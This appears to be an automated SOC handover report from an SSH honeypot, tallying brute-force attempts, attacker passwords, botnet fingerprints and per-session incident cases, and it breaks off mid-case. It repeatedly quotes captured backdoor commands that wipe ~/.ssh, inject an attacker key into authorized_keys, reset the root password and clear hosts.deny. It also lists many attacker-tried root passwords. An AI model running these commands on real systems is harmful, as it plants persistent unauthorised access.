# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-04 |
| **Generated At** | 2026-06-04T10:01:57Z |
| **Shift Time** | 10:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **579** |
| Confirmed Threats | **555** |
| False Positives Filtered | **24** (4.2%) |
| Unique Attacker IPs | **59** |
| Countries of Origin | **17** |
| High Severity Cases | **164** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **415** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **423** |
| Unique Credential Pairs | **211** |
| Unique Usernames | **132** |
| Unique Passwords | **174** |
| Successful Auth Pairs | **111** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 164 |
| `345gs5662d34` | 82 |
| `ubuntu` | 7 |
| `user` | 4 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 82 |
| `3245gs5662d34` | 78 |
| `123456` | 30 |
| `123` | 7 |
| `1` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 82 |
| `root` | `3245gs5662d34` | 78 |
| `kubernetes` | `kubernetes@123` | 3 |
| `abhinav` | `abhinav` | 3 |
| `zwj` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Password@_` | `152.32.205.153` | 2026-06-04T04:21:46 |
| `root` | `3245gs5662d34` | `152.32.205.153` | 2026-06-04T04:21:51 |
| `root` | `Yr123456` | `72.253.251.7` | 2026-06-04T04:23:13 |
| `root` | `3245gs5662d34` | `72.253.251.7` | 2026-06-04T04:23:20 |
| `root` | `Vps2026` | `152.32.205.153` | 2026-06-04T04:26:52 |
| `root` | `qwer@2026` | `152.32.205.153` | 2026-06-04T04:32:13 |
| `root` | `@dm1n2025` | `152.32.205.153` | 2026-06-04T04:35:47 |
| `root` | `ff123456` | `152.32.205.153` | 2026-06-04T04:46:10 |
| `root` | `sofresh` | `152.32.205.153` | 2026-06-04T05:00:20 |
| `root` | `p@ck3tf3nc3` | `152.32.205.153` | 2026-06-04T05:03:42 |
| `root` | `Tencent@123` | `122.175.36.92` | 2026-06-04T05:37:47 |
| `root` | `3245gs5662d34` | `122.175.36.92` | 2026-06-04T05:37:48 |
| `root` | `Abcd123#` | `67.52.95.38` | 2026-06-04T06:25:12 |
| `root` | `3245gs5662d34` | `67.52.95.38` | 2026-06-04T06:25:19 |
| `root` | `asdf1234.` | `107.150.105.153` | 2026-06-04T06:30:50 |
| `root` | `3245gs5662d34` | `107.150.105.153` | 2026-06-04T06:30:56 |
| `root` | `Qwer123!@#` | `202.152.201.166` | 2026-06-04T06:42:08 |
| `root` | `3245gs5662d34` | `202.152.201.166` | 2026-06-04T06:42:13 |
| `root` | `root12#$` | `202.152.201.166` | 2026-06-04T06:42:33 |
| `root` | `5nWt3P-fF4WosQm5O` | `202.152.201.166` | 2026-06-04T06:45:21 |
| `root` | `qwer_1234` | `202.152.201.166` | 2026-06-04T06:46:37 |
| `root` | `19821982` | `5.75.225.42` | 2026-06-04T06:46:44 |
| `root` | `3245gs5662d34` | `5.75.225.42` | 2026-06-04T06:46:48 |
| `root` | `k` | `202.152.201.166` | 2026-06-04T06:47:24 |
| `root` | `root12#$` | `46.253.45.10` | 2026-06-04T06:49:05 |
| `root` | `3245gs5662d34` | `46.253.45.10` | 2026-06-04T06:49:09 |
| `root` | `Qw123456` | `202.152.201.166` | 2026-06-04T06:49:20 |
| `root` | `Aa@123` | `202.152.201.166` | 2026-06-04T06:49:44 |
| `root` | `1q2w!Q@W` | `202.152.201.166` | 2026-06-04T06:50:53 |
| `root` | `amir123` | `202.152.201.166` | 2026-06-04T06:51:18 |
| `root` | `123@.com` | `1.238.106.229` | 2026-06-04T06:51:54 |
| `root` | `3245gs5662d34` | `1.238.106.229` | 2026-06-04T06:51:58 |
| `root` | `q1w2e3r4.1234` | `202.152.201.166` | 2026-06-04T06:52:34 |
| `root` | `qwer_1234` | `193.36.84.162` | 2026-06-04T06:54:44 |
| `root` | `3245gs5662d34` | `193.36.84.162` | 2026-06-04T06:54:55 |
| `root` | `Oracle2024` | `1.238.106.229` | 2026-06-04T06:55:55 |
| `root` | `123@.com` | `211.228.218.47` | 2026-06-04T06:57:40 |
| `root` | `3245gs5662d34` | `211.228.218.47` | 2026-06-04T06:57:43 |
| `root` | `12345abc` | `1.238.106.229` | 2026-06-04T06:59:51 |
| `root` | `dh-qQ3j!soft` | `211.228.218.47` | 2026-06-04T07:07:30 |
| `root` | `Oracle2024` | `211.228.218.47` | 2026-06-04T07:09:33 |
| `root` | `dh-qQ3j!soft` | `1.238.106.229` | 2026-06-04T07:09:44 |
| `root` | `zxcvbnm1234567` | `211.228.218.47` | 2026-06-04T07:11:33 |
| `root` | `hoang123` | `211.228.218.47` | 2026-06-04T07:13:36 |
| `root` | `Xh123456` | `1.238.106.229` | 2026-06-04T07:15:28 |
| `root` | `ly123456` | `1.238.106.229` | 2026-06-04T07:19:16 |
| `root` | `!Q2w3e$R` | `211.228.218.47` | 2026-06-04T07:19:31 |
| `root` | `123QWEqwe` | `1.238.106.229` | 2026-06-04T07:21:16 |
| `root` | `zxcvbnm1234567` | `1.238.106.229` | 2026-06-04T07:25:08 |
| `root` | `carpediem` | `115.135.233.75` | 2026-06-04T07:26:09 |
| `root` | `3245gs5662d34` | `115.135.233.75` | 2026-06-04T07:26:12 |
| `root` | `123123123a` | `1.238.106.229` | 2026-06-04T07:27:12 |
| `root` | `Xh123456` | `211.228.218.47` | 2026-06-04T07:31:31 |
| `root` | `root1234root` | `115.135.233.75` | 2026-06-04T07:35:19 |
| `root` | `123123123a` | `211.228.218.47` | 2026-06-04T07:35:28 |
| `root` | `hoang123` | `1.238.106.229` | 2026-06-04T07:36:45 |
| `root` | `123QWEqwe` | `211.228.218.47` | 2026-06-04T07:37:23 |
| `root` | `!Q2w3e$R` | `1.238.106.229` | 2026-06-04T07:38:43 |
| `root` | `5454` | `115.135.233.75` | 2026-06-04T07:39:51 |
| `root` | `12345abc` | `211.228.218.47` | 2026-06-04T07:45:29 |
| `root` | `ly123456` | `211.228.218.47` | 2026-06-04T07:47:29 |
| `root` | `Admin123#` | `115.135.233.75` | 2026-06-04T08:00:14 |
| `root` | `123@Abc` | `197.140.18.248` | 2026-06-04T08:00:19 |
| `root` | `3245gs5662d34` | `197.140.18.248` | 2026-06-04T08:00:23 |
| `root` | `Xz@123456` | `101.227.203.162` | 2026-06-04T08:02:34 |
| `root` | `123123123a` | `36.82.45.61` | 2026-06-04T08:05:47 |
| `root` | `Pambazuka08` | `101.227.203.162` | 2026-06-04T08:07:46 |
| `root` | `3245gs5662d34` | `101.227.203.162` | 2026-06-04T08:07:50 |
| `root` | `Password@1234!` | `115.135.233.75` | 2026-06-04T08:09:14 |
| `root` | `Web@123` | `115.135.233.75` | 2026-06-04T08:11:28 |
| `root` | `Ab-123456` | `101.227.203.162` | 2026-06-04T08:12:00 |
| `root` | `1qazxsw2@123` | `115.135.233.75` | 2026-06-04T08:16:00 |
| `root` | `!Q2w3e$R` | `36.82.45.61` | 2026-06-04T08:18:33 |
| `root` | `3245gs5662d34` | `36.82.45.61` | 2026-06-04T08:18:35 |
| `root` | `Zz123456..` | `115.135.233.75` | 2026-06-04T08:22:52 |
| `root` | `Qw123456` | `98.71.8.129` | 2026-06-04T08:23:57 |
| `root` | `3245gs5662d34` | `98.71.8.129` | 2026-06-04T08:24:01 |
| `root` | `ly123456` | `36.82.45.61` | 2026-06-04T08:24:42 |
| `root` | `Gd123456` | `115.135.233.75` | 2026-06-04T08:27:20 |
| `root` | `1234567890987654321` | `157.20.254.47` | 2026-06-04T08:28:49 |
| `root` | `3245gs5662d34` | `157.20.254.47` | 2026-06-04T08:29:06 |
| `root` | `Xr123456` | `115.135.233.75` | 2026-06-04T08:29:34 |
| `root` | `Qwertyu1` | `157.20.254.47` | 2026-06-04T08:39:24 |
| `root` | `Lq123456` | `157.20.254.47` | 2026-06-04T08:47:18 |
| `root` | `12345678910` | `58.209.82.184` | 2026-06-04T08:54:48 |
| `root` | `654654` | `209.99.190.113` | 2026-06-04T08:56:44 |
| `root` | `3245gs5662d34` | `209.99.190.113` | 2026-06-04T08:56:48 |
| `root` | `qazXSW123` | `157.20.254.47` | 2026-06-04T08:57:49 |
| `root` | `qwerty@123` | `45.119.84.196` | 2026-06-04T09:04:53 |
| `root` | `3245gs5662d34` | `45.119.84.196` | 2026-06-04T09:04:56 |
| `root` | `Aa1234567890!` | `114.242.24.31` | 2026-06-04T09:05:52 |
| `root` | `1Qazxsw@` | `2.27.20.28` | 2026-06-04T09:08:17 |
| `root` | `3245gs5662d34` | `2.27.20.28` | 2026-06-04T09:08:21 |
| `root` | `c9p5au8naa` | `2.27.20.28` | 2026-06-04T09:09:51 |
| `root` | `Aa123456...` | `2.27.20.28` | 2026-06-04T09:12:51 |
| `root` | `Pa55word` | `2.27.20.28` | 2026-06-04T09:14:27 |
| `root` | `123456qwe!` | `2.27.20.28` | 2026-06-04T09:16:06 |
| `root` | `654654` | `2.27.20.28` | 2026-06-04T09:17:41 |
| `root` | `@qwer2025` | `2.27.20.28` | 2026-06-04T09:22:26 |
| `root` | `Qq@123456` | `103.75.182.178` | 2026-06-04T09:30:40 |
| `root` | `3245gs5662d34` | `103.75.182.178` | 2026-06-04T09:30:43 |
| `root` | `Root12#$` | `150.5.131.119` | 2026-06-04T09:32:03 |
| `root` | `3245gs5662d34` | `150.5.131.119` | 2026-06-04T09:32:07 |
| `root` | `tmp123` | `103.143.12.163` | 2026-06-04T09:38:38 |
| `root` | `3245gs5662d34` | `103.143.12.163` | 2026-06-04T09:38:40 |
| `root` | `a7758521` | `103.143.12.163` | 2026-06-04T09:49:59 |
| `root` | `123qwe123qwe` | `103.90.227.203` | 2026-06-04T09:50:08 |
| `root` | `3245gs5662d34` | `103.90.227.203` | 2026-06-04T09:50:10 |
| `root` | `Abc123456.` | `103.143.12.163` | 2026-06-04T09:52:11 |
| `root` | `1122334455` | `20.127.185.37` | 2026-06-04T09:54:07 |
| `root` | `3245gs5662d34` | `20.127.185.37` | 2026-06-04T09:54:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **579** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 457 |
| PuTTY | 6 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 361 | 25 |
| `03a80b21afa8...` | Modern SSH client | 96 | 8 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 361 | 25 | Mirai/variant |
| `03a80b21afa8...` | libssh | 96 | 8 | Modern SSH client |
| `95420f9d932d...` | PuTTY | 6 | 5 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 78 | 25 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:8Di0JdqyIfCG"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `58.209.82.184`, `36.82.45.61`, `114.242.24.31`, `157.20.254.47`, `101.227.203.162`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `67.52.95.38`, `193.36.84.162`, `1.238.106.229`, `211.228.218.47`, `202.152.201.166`, `115.135.233.75`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **59** |
| Unique ASNs | **49** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9269` | Hong Kong Broadband Network Ltd. | 1 | HIGH |
| `AS402253` | SKN Subnet & Telecom Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (164)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4e38b33f0a41

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:21 |
| **Last Seen** | 2026-06-04 04:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:21:45` | `cowrie.session.connect` |
| `2026-06-04 04:21:45` | `cowrie.client.version` |
| `2026-06-04 04:21:45` | `cowrie.client.kex` |
| `2026-06-04 04:21:46` | `cowrie.login.success` |
| `2026-06-04 04:21:47` | `cowrie.session.params` |
| `2026-06-04 04:21:47` | `cowrie.command.input` |
| `2026-06-04 04:21:47` | `cowrie.command.failed` |
| `2026-06-04 04:21:47` | `cowrie.log.closed` |
| `2026-06-04 04:21:47` | `cowrie.session.params` |
| `2026-06-04 04:21:47` | `cowrie.command.input` |
| `2026-06-04 04:21:48` | `cowrie.session.file_download` |
| `2026-06-04 04:21:48` | `cowrie.log.closed` |
| `2026-06-04 04:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa14b43f034a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:21 |
| **Last Seen** | 2026-06-04 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:21:50` | `cowrie.session.connect` |
| `2026-06-04 04:21:50` | `cowrie.client.version` |
| `2026-06-04 04:21:50` | `cowrie.client.kex` |
| `2026-06-04 04:21:51` | `cowrie.login.success` |
| `2026-06-04 04:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046c848dd976

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-06-04 04:23 |
| **Last Seen** | 2026-06-04 04:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:23:12` | `cowrie.session.connect` |
| `2026-06-04 04:23:12` | `cowrie.client.version` |
| `2026-06-04 04:23:12` | `cowrie.client.kex` |
| `2026-06-04 04:23:13` | `cowrie.login.success` |
| `2026-06-04 04:23:14` | `cowrie.session.params` |
| `2026-06-04 04:23:14` | `cowrie.command.input` |
| `2026-06-04 04:23:14` | `cowrie.command.failed` |
| `2026-06-04 04:23:14` | `cowrie.log.closed` |
| `2026-06-04 04:23:15` | `cowrie.session.params` |
| `2026-06-04 04:23:15` | `cowrie.command.input` |
| `2026-06-04 04:23:15` | `cowrie.session.file_download` |
| `2026-06-04 04:23:15` | `cowrie.log.closed` |
| `2026-06-04 04:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb75bc5691f

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-06-04 04:23 |
| **Last Seen** | 2026-06-04 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:23:18` | `cowrie.session.connect` |
| `2026-06-04 04:23:18` | `cowrie.client.version` |
| `2026-06-04 04:23:19` | `cowrie.client.kex` |
| `2026-06-04 04:23:20` | `cowrie.login.success` |
| `2026-06-04 04:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ab3920774f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:26 |
| **Last Seen** | 2026-06-04 04:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:26:51` | `cowrie.session.connect` |
| `2026-06-04 04:26:51` | `cowrie.client.version` |
| `2026-06-04 04:26:51` | `cowrie.client.kex` |
| `2026-06-04 04:26:52` | `cowrie.login.success` |
| `2026-06-04 04:26:53` | `cowrie.session.params` |
| `2026-06-04 04:26:53` | `cowrie.command.input` |
| `2026-06-04 04:26:53` | `cowrie.command.failed` |
| `2026-06-04 04:26:53` | `cowrie.log.closed` |
| `2026-06-04 04:26:53` | `cowrie.session.params` |
| `2026-06-04 04:26:53` | `cowrie.command.input` |
| `2026-06-04 04:26:53` | `cowrie.session.file_download` |
| `2026-06-04 04:26:53` | `cowrie.log.closed` |
| `2026-06-04 04:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda74d2c469a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:26 |
| **Last Seen** | 2026-06-04 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:26:56` | `cowrie.session.connect` |
| `2026-06-04 04:26:56` | `cowrie.client.version` |
| `2026-06-04 04:26:56` | `cowrie.client.kex` |
| `2026-06-04 04:26:57` | `cowrie.login.success` |
| `2026-06-04 04:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aab3e101c25

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:32 |
| **Last Seen** | 2026-06-04 04:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:32:12` | `cowrie.session.connect` |
| `2026-06-04 04:32:12` | `cowrie.client.version` |
| `2026-06-04 04:32:12` | `cowrie.client.kex` |
| `2026-06-04 04:32:13` | `cowrie.login.success` |
| `2026-06-04 04:32:14` | `cowrie.session.params` |
| `2026-06-04 04:32:14` | `cowrie.command.input` |
| `2026-06-04 04:32:14` | `cowrie.command.failed` |
| `2026-06-04 04:32:14` | `cowrie.log.closed` |
| `2026-06-04 04:32:14` | `cowrie.session.params` |
| `2026-06-04 04:32:14` | `cowrie.command.input` |
| `2026-06-04 04:32:15` | `cowrie.session.file_download` |
| `2026-06-04 04:32:15` | `cowrie.log.closed` |
| `2026-06-04 04:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02982b46927e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:32 |
| **Last Seen** | 2026-06-04 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:32:17` | `cowrie.session.connect` |
| `2026-06-04 04:32:17` | `cowrie.client.version` |
| `2026-06-04 04:32:17` | `cowrie.client.kex` |
| `2026-06-04 04:32:18` | `cowrie.login.success` |
| `2026-06-04 04:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
